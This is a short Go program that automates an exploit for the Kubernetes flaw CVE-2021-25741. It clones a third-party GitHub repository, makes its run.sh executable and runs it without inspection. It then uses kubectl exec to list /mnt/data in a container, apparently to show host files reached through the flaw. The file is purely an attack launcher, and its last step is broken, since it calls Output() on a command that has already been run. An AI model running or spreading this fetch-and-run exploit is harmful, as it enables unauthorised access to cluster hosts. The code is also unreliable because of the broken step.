package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func mainfunc() {
	fmt.Println("Start to execute the auto script, please wait")
	// 1. git clone <url>
	gitCloneCmd := exec.Command("git", "clone", "https://github.com/jerrybowang/CVE-2021-25741.git")
	if err := gitCloneCmd.Run(); err != nil {
		fmt.Println("Git clone failed:", err)
		return
	}

	// 2. cd to the cloned repo
	os.Chdir("CVE-2021-25741")

	// 3. chmod +x run.sh; ./run.sh and wait for the script to complete
	chmodCmd := exec.Command("chmod", "+x", "run.sh")
	if err := chmodCmd.Run(); err != nil {
		fmt.Println("Chmod failed:", err)
		return
	}

	runScriptCmd := exec.Command("./run.sh")
	if err := runScriptCmd.Run(); err != nil {
		fmt.Println("Script execution failed:", err)
		return
	}

	// 4. kubectl exec -i -t cve202125741 -c mount-container -- /bin/sh -c "ls /mnt/data"
	kubectlCmd := exec.Command("kubectl", "exec", "-i", "cve202125741", "-c", "mount-container", "--", "/bin/sh", "-c", "ls /mnt/data")
	kubectlCmd.Stdin = os.Stdin
	kubectlCmd.Stdout = os.Stdout
	kubectlCmd.Stderr = os.Stderr

	if err := kubectlCmd.Run(); err != nil {
		fmt.Println("Kubectl exec failed:", err)
		return
	}

	// 5. Print the result of ls /mnt/data inside the container
	lsOutput, err := kubectlCmd.Output()
	if err != nil {
		fmt.Println("Error running ls command inside the container:", err)
		return
	}

	fmt.Println("ls /mnt/data output:")
	fmt.Println(strings.TrimSpace(string(lsOutput)))
}
